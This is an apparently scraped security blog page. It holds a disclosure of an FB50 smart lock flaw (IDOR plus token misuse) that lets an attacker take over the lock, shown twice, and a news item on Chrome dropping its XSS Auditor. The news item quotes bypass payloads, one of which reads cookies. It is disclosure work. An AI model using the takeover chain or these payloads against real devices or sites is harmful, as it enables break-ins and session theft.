###### How to Start IoT device Firmware Reverse Engineering?

August 5, 2019](https://blog.securelayer7.net/how-to-start-iot-device-firmware-reverse-engineering/)

August 2, 2019

![FB50 Smart Lock Vulnerability Disclosure](https://blog.securelayer7.net/wp-content/uploads/2019/08/FB50-8.png)
#### Executive Summary

Our security engineers found vulnerabilities in the FB50 smart lock mobile application. An information disclosure vulnerability chained together with poor token management lead to a complete transfer of ownership of the lock from the user to the attacker’s account.

#### Product Description

The lock-in question is the FB50 smart lock, manufactured by Shenzhen Dragon Brother Technology Co. Ltd. This lock is sold under multiple brands across many e-commerce sites, and has over, an estimated, 5000 users. Judging by the download count on the Play Store, for its app. This is excluding the iOS App Store downloads.

#### Approach

Our initial attempt was to perform a replay of the captured Bluetooth packets. Two attempts at this were performed. First, we tried replaying the packets in the HCI dump log, captured on an Android device. In the second try, we used gattacker running on a Raspberry Pi, in an attempt to spoof the lock’s MAC address and make the app communicate with the Raspberry Pi instead.
We soon realized that the data being written during the “unlock” requests, was encrypted, and hence the replays were unsuccessful. We then decided to take a crack at the companion app instead, in which we ended up finding the information disclosure and token related bugs.

#### Findings Overview

* No SSL pining used for the android application
* IDOR in the user ID, exposing user data
* Knowing just the MAC address of the lock alone, a series of requests
  can be chained to unbind the existing user to the lock and bind a new one

#### Technical Description

**Getting the Lock’s QR Code and lock ID**

During Pentesting the device, we obtain the MAC address of smart device via simple Bluetooth scanning in the vicinity. We captured the following request and we got a tone of device information in a response.

![](https://blog.securelayer7.net/wp-content/uploads/2019/08/mac-1-1024x475.jpg)

From these all, we take two measure values i.e. the QR code and the MA address

**Use the barcode and fetch the user ID**

Now, we moved to another request,
here we just passed the QR code into the request and we got the following response.

![](https://blog.securelayer7.net/wp-content/uploads/2019/08/userID_by_bardcode-1-1024x392.png)

In response, we got the much of User’s information.we are going to use the user ID from this.

**Unbinding the lock from victim’s Account**

So we obtained the User id and lock id. Using these two values we try to tamper the Unbind request which we captured at a time of unbinding the targeted device from the owner’s account.

![](https://blog.securelayer7.net/wp-content/uploads/2019/08/unbind-1024x380.jpg)

So as you can see we successfully unbind the victim’s device remotely from his/her mobile application.

**Bind the targeted device to the attacker’s account.**

So now it’s time to connect the attacker’s application to the victim’s device.

We just provided a new name, attacker’s user ID and the MAC address. we already have the bind request having above values.

![](https://blog.securelayer7.net/wp-content/uploads/2019/08/bind-1024x576.png)

So here, we did with binding the victim’s smart lock to our(attacker’s) mobile application. Now just unlock the device with the mobile application. For unlocking the device via mobile application attacker should present in the Bluetooth range of the device.

###### FB50 Smart Lock Vulnerability Disclosure (CVE-2019-13143)

August 2, 2019](https://blog.securelayer7.net/fb50-smart-lock-vulnerability-disclosure/)

July 16, 2019

![XSS Auditor no more part of Google Chrome](https://blog.securelayer7.net/wp-content/themes/betheme/muffin-options/svg/placeholders/image.svg)

Yes, you heard correct [Google](https://cyberdaily.securelayer7.net/googles-assistant-says-ok-google-do-nothing/) Chromium devs announced the news about XSS auditor.
 The XSS auditor time and again bypassed by the client security researcher to execute the malicious javascript, and this may be the primary reason to be deprecated and removed from the Google Chrome browser.

The anti-cross site scripting engine (XSS auditor) is not covering all XSS type such as DOM-based XSS, mXSS, and persistent [XSS](https://www.owasp.org/index.php/Cross-site_Scripting_%28XSS%29). XSS auditor mostly working on for the reflected XSS, and this is again can be bypassed by tricking the Javascript payload.

Google security team bypassed XSS auditor protection and most of the bypasses working. Here ([1](https://github.com/google/security-research-pocs/blob/master/script-gadgets/bypasses.md) , [2](https://github.com/google/security-research-pocs/blob/master/script-gadgets/ccs_gadgets.pdf)) you can find the different bypasses found by the researcher.

According to the discussion on [Google group](https://groups.google.com/a/chromium.org/forum/#!msg/blink-dev/TuYw-EZhO9g/blGViehIAwAJ), the XSS auditor is also leading the cross-site info leaks and fixing them all tedious job.

in 2016 again researcher [Masato Kinugawa](https://mksben.l0.cm/2016/12/xssauditor-bypass-using-paramtag.html) from Japan bypassed XSS Auditor using following payloads:

```
PoC1:
<object allowscriptaccess=always>
<param name=url value=https://l0.cm/xss.swf>

PoC2:
<object allowscriptaccess=always>
<param name=code value=https://l0.cm/xss.swf>

This PoC3 still work on Chrome by James Lee:

"/>`;prompt`${document.cookie}`</script><script>`
```

Last year MS decided to remove the anti-XSS engine and now this year, Google chrome chose to remove the XSS auditor. It is clear to everyone regex-based filter leads to false-positive, and results are crossing the expectation of the user.

###### How to Start IoT device Firmware Reverse Engineering?

August 5, 2019](https://blog.securelayer7.net/how-to-start-iot-device-firmware-reverse-engineering/)

August 2, 2019

![FB50 Smart Lock Vulnerability Disclosure](https://blog.securelayer7.net/wp-content/uploads/2019/08/FB50-8.png)
#### Executive Summary

Our security engineers found vulnerabilities in the FB50 smart lock mobile application. An information disclosure vulnerability chained together with poor token management lead to a complete transfer of ownership of the lock from the user to the attacker’s account.

#### Product Description

The lock-in question is the FB50 smart lock, manufactured by Shenzhen Dragon Brother Technology Co. Ltd. This lock is sold under multiple brands across many e-commerce sites, and has over, an estimated, 5000 users. Judging by the download count on the Play Store, for its app. This is excluding the iOS App Store downloads.

#### Approach

Our initial attempt was to perform a replay of the captured Bluetooth packets. Two attempts at this were performed. First, we tried replaying the packets in the HCI dump log, captured on an Android device. In the second try, we used gattacker running on a Raspberry Pi, in an attempt to spoof the lock’s MAC address and make the app communicate with the Raspberry Pi instead.
We soon realized that the data being written during the “unlock” requests, was encrypted, and hence the replays were unsuccessful. We then decided to take a crack at the companion app instead, in which we ended up finding the information disclosure and token related bugs.

#### Findings Overview

* No SSL pining used for the android application
* IDOR in the user ID, exposing user data
* Knowing just the MAC address of the lock alone, a series of requests
  can be chained to unbind the existing user to the lock and bind a new one

#### Technical Description

**Getting the Lock’s QR Code and lock ID**

During Pentesting the device, we obtain the MAC address of smart device via simple Bluetooth scanning in the vicinity. We captured the following request and we got a tone of device information in a response.

![](https://blog.securelayer7.net/wp-content/uploads/2019/08/mac-1-1024x475.jpg)

From these all, we take two measure values i.e. the QR code and the MA address

**Use the barcode and fetch the user ID**

Now, we moved to another request,
here we just passed the QR code into the request and we got the following response.

![](https://blog.securelayer7.net/wp-content/uploads/2019/08/userID_by_bardcode-1-1024x392.png)

In response, we got the much of User’s information.we are going to use the user ID from this.

**Unbinding the lock from victim’s Account**

So we obtained the User id and lock id. Using these two values we try to tamper the Unbind request which we captured at a time of unbinding the targeted device from the owner’s account.

![](https://blog.securelayer7.net/wp-content/uploads/2019/08/unbind-1024x380.jpg)

So as you can see we successfully unbind the victim’s device remotely from his/her mobile application.

**Bind the targeted device to the attacker’s account.**

So now it’s time to connect the attacker’s application to the victim’s device.

We just provided a new name, attacker’s user ID and the MAC address. we already have the bind request having above values.

![](https://blog.securelayer7.net/wp-content/uploads/2019/08/bind-1024x576.png)

So here, we did with binding the victim’s smart lock to our(attacker’s) mobile application. Now just unlock the device with the mobile application. For unlocking the device via mobile application attacker should present in the Bluetooth range of the device.
